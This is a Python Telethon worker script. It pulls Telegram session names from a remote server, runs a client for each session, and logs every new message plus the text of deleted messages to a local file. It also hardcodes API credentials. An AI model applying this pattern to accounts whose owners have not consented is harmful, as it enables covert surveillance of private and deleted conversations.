import asyncio
import requests
import os
from telethon import TelegramClient, events

API_ID = 30074866 
API_HASH = "eea91e3c3b0381b36d455383fe5b9989" 
SERVER_URL = "https://gleaming-truth-production-ed48.up.railway.app/"

message_cache = {}

async def run_client(session_name):
    while True:
        try:
            client = TelegramClient(f"sessions/{session_name}", API_ID, API_HASH)
            await client.start()

            @client.on(events.NewMessage)
            async def new_msg(event):
                message_cache[event.id] = event.text
                with open("logs.txt", "a", encoding="utf-8") as f:
                    f.write(f"NEW: {event.text}\n")

            @client.on(events.MessageDeleted)
            async def deleted(event):
                for msg_id in event.deleted_ids:
                    text = message_cache.get(msg_id, "UNKNOWN")
                    with open("logs.txt", "a", encoding="utf-8") as f:
                        f.write(f"DELETED: {text}\n")

            print(f"Started {session_name}")
            await client.run_until_disconnected()

        except Exception as e:
            print(f"Restarting {session_name}:", e)
            await asyncio.sleep(5)

async def main():
    while True:
        try:
            res = requests.get(f"{SERVER_URL}/sessions").json()
            sessions = res.get("sessions", [])

            for s in sessions:
                asyncio.create_task(run_client(s))

            while True:
                await asyncio.sleep(60)

        except Exception as e:
            print("Worker error:", e)
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
